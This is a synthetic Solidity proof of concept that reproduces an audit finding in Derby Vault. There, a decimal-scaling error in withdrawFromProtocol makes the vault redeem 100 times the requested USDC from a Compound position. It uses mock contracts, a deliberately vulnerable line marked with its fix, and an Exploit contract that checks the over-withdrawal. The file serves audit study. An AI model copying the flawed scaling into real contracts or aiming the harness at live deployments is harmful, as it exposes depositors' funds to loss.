// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Derby Vault.withdrawFromProtocol scales a vaultCurrency withdrawal by the
    LP token's decimals (Sherlock 2023-01, finding 12293 / H-11).
    SYNTHETIC, cheatcode-free. The scale expression is the audited line (@> VULN).

    Report's numbers, USDC vault (6 decimals) into Compound cUSDC (8 decimals):
      request 10^12 raw = 1_000_000 USDC
      protocol.uScale   = 10^8   (cUSDC decimals)
      vault uScale      = 10^6   (USDC decimals)
      scaled             = 10^12 * 10^8 / 10^6 = 10^14
    calcShares treats 10^14 as USDC, so the provider redeems 100_000_000 USDC.
    A fair underlying-scale leaves the request at 10^12 and redeems 1_000_000.
    The Compound position is short the extra 99_000_000 USDC.

    Exchange rate is Compound's 1.0 mantissa for a 6-decimal underlying:
    10^(18 - 8 + 6) = 10^16. At that rate one raw cUSDC share is one raw USDC,
    so the 100x is only the scale bug, not a price. */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata {
    function decimals() external view returns (uint8);
}

interface ICToken {
    function underlying() external view returns (address);
    function exchangeRateStored() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IController {
    struct ProtocolInfoS {
        address LPToken;
        address provider;
        address underlying; // address of underlying token of the protocol eg USDC
        uint256 uScale; // uScale of protocol LP Token
    }

    function getProtocolInfo(uint256 vaultNumber, uint256 protocolNum)
        external
        view
        returns (ProtocolInfoS memory);
}

interface IProvider {
    function calcShares(uint256 _amount, address lpToken) external view returns (uint256);
    function balance(address who, address lpToken) external view returns (uint256);
    function withdraw(uint256 amount, address lpToken, address underlying) external returns (uint256);
}

contract MockERC20 is IERC20, IERC20Metadata {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// cUSDC stand-in. decimals = 8. Redeem pays underlying with Compound's mantissa.
contract MockCToken is ICToken {
    string public name = "Compound USD Coin";
    string public symbol = "cUSDC";
    uint8 public decimals = 8;
    address public underlying;
    uint256 public exchangeRateStored;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address _underlying, uint256 _exchangeRate) {
        underlying = _underlying;
        exchangeRateStored = _exchangeRate;
    }

    function mintShares(address to, uint256 shares) external {
        balanceOf[to] += shares;
        totalSupply += shares;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function redeem(uint256 shares) external returns (uint256) {
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        uint256 decs = uint256(IERC20Metadata(underlying).decimals());
        uint256 underlyingOut = (shares * exchangeRateStored) / (10 ** (10 + decs));
        require(IERC20(underlying).transfer(msg.sender, underlyingOut), "redeem");
        return 0;
    }
}

contract Controller is IController {
    ProtocolInfoS internal info;

    constructor(address lp, address provider, address underlying_, uint256 lpScale) {
        info = ProtocolInfoS({LPToken: lp, provider: provider, underlying: underlying_, uScale: lpScale});
    }

    function getProtocolInfo(uint256, uint256) external view returns (ProtocolInfoS memory) {
        return info;
    }
}

/// CompoundProvider.calcShares, verbatim. `_amount` is documented as underlying (USDC).
contract CompoundProvider is IProvider {
    /// @notice Calculates how many shares are equal to the amount
    /// @dev returned price from compound is scaled https://compound.finance/docs/ctokens#exchange-rate
    /// @param _amount Amount in underyling token e.g USDC
    /// @param _cToken Address of protocol LP Token eg cUSDC
    /// @return number of shares i.e LP tokens
    function calcShares(uint256 _amount, address _cToken) external view override returns (uint256) {
        uint256 decimals = IERC20Metadata(ICToken(_cToken).underlying()).decimals();
        uint256 shares = (_amount * (10 ** (10 + decimals))) / exchangeRate(_cToken);
        return shares;
    }

    function exchangeRate(address _cToken) public view returns (uint256) {
        uint256 _price = ICToken(_cToken).exchangeRateStored();
        return _price;
    }

    function balance(address _address, address _cToken) public view override returns (uint256) {
        uint256 _balanceShares = ICToken(_cToken).balanceOf(_address);
        return _balanceShares;
    }

    /// @notice Withdraw the underlying asset from Compound
    /// @param _amount Amount of cTokens to redeem
    /// @param _cToken Address of protocol LP Token eg cUSDC
    /// @param _uToken Address of underlying Token eg USDC
    /// @return Underlying tokens received and sent to the vault e.g USDC
    function withdraw(uint256 _amount, address _cToken, address _uToken) external override returns (uint256) {
        uint256 balanceBefore = IERC20(_uToken).balanceOf(msg.sender);
        uint256 balanceBeforeRedeem = IERC20(_uToken).balanceOf(address(this));

        require(ICToken(_cToken).transferFrom(msg.sender, address(this), _amount) == true, "Error: transferFrom");
        require(ICToken(_cToken).redeem(_amount) == 0, "Error: compound redeem");

        uint256 balanceAfterRedeem = IERC20(_uToken).balanceOf(address(this));
        uint256 uTokensReceived = balanceAfterRedeem - balanceBeforeRedeem;

        require(IERC20(_uToken).transfer(msg.sender, uTokensReceived), "transfer");

        uint256 balanceAfter = IERC20(_uToken).balanceOf(msg.sender);
        require((balanceAfter - balanceBefore - uTokensReceived) == 0, "Error Withdraw: under/overflow");

        return uTokensReceived;
    }
}

/// Reduced Derby Vault. withdrawFromProtocol is internal in Vault.sol and is
/// reached from rebalance, pullFunds, and blacklistProtocol. It is public here
/// so the playground can enter it. The scale and the two calls under it are
/// the audited lines. Underlying is the vault currency (USDC), so the
/// post-withdraw stable swap in the original is not taken.
contract DerbyVault {
    IController public controller;
    address public vaultCurrency;
    uint256 public vaultNumber;
    uint256 public uScale;
    uint256 public lastScaled;
    uint256 public lastShares;
    uint256 public lastReceived;

    constructor(address _controller, address _vaultCurrency, uint256 _uScale) {
        controller = IController(_controller);
        vaultCurrency = _vaultCurrency;
        uScale = _uScale;
    }

    /// @notice Withdraw amount from underlying protocol
    /// @dev shares = amount / PricePerShare
    /// @param _protocolNum Protocol number linked to an underlying protocol e.g compound_usdc_01
    /// @param _amount in VaultCurrency to withdraw
    function withdrawFromProtocol(uint256 _protocolNum, uint256 _amount) public {
        if (_amount <= 0) return;
        IController.ProtocolInfoS memory protocol = controller.getProtocolInfo(vaultNumber, _protocolNum);

        // @> VULN: protocol.uScale is 10**cUSDC decimals; calcShares expects USDC decimals, so 1e12 becomes 1e14.
        _amount = (_amount * protocol.uScale) / uScale;
        // FIX: _amount = (_amount * underlyingScale) / uScale, with underlyingScale = 10**USDC decimals.
        uint256 shares = IProvider(protocol.provider).calcShares(_amount, protocol.LPToken);
        uint256 balance = IProvider(protocol.provider).balance(address(this), protocol.LPToken);

        if (shares == 0) return;
        if (balance < shares) shares = balance;

        IERC20(protocol.LPToken).approve(protocol.provider, shares);
        uint256 amountReceived =
            IProvider(protocol.provider).withdraw(shares, protocol.LPToken, protocol.underlying);
        lastShares = shares;
        lastScaled = _amount;
        lastReceived = amountReceived;
    }
}

contract Exploit {
    // Report: 10^12 raw is a request for 10^6 USDC. The bug asks for 10^14.
    uint256 public constant REQUEST = 1_000_000 * 1e6; // 1e12
    uint256 public constant POSITION = 200_000_000 * 1e6; // 2e14 book, so the 100x pull is not capped
    uint256 public constant BUGGY = 100_000_000 * 1e6; // 1e14
    uint256 public constant SHORT = 99_000_000 * 1e6; // extra USDC pulled out of Compound
    // 10^(10 + USDC decimals) — Compound exchangeRateStored at a 1.0 price.
    uint256 public constant EXCHANGE_RATE = 10 ** 16;

    MockERC20 public usdc; // nonce 1
    MockCToken public cusdc; // nonce 2
    CompoundProvider public provider; // nonce 3
    Controller public controller; // nonce 4
    DerbyVault public vault; // nonce 5

    uint256 public checkpoint;
    uint256 public pulled;
    uint256 public left;

    constructor() {
        usdc = new MockERC20("USD Coin", "USDC", 6);
        cusdc = new MockCToken(address(usdc), EXCHANGE_RATE);
        provider = new CompoundProvider();
        controller = new Controller(address(cusdc), address(provider), address(usdc), 10 ** 8);
        vault = new DerbyVault(address(controller), address(usdc), 10 ** 6);
        usdc.mint(address(cusdc), POSITION);
        cusdc.mintShares(address(vault), POSITION);
    }

    function run() external {
        checkpoint = cusdc.balanceOf(address(vault));
        vault.withdrawFromProtocol(0, REQUEST);
        pulled = usdc.balanceOf(address(vault));
        left = cusdc.balanceOf(address(vault));
        require(checkpoint == POSITION, "seed");
        require(vault.lastScaled() == BUGGY, "scaled");
        require(vault.lastShares() == BUGGY, "shares");
        require(vault.lastReceived() == pulled, "received");
        require(pulled == BUGGY, "usdc");
        require(POSITION - REQUEST - left == SHORT, "short");
    }
}
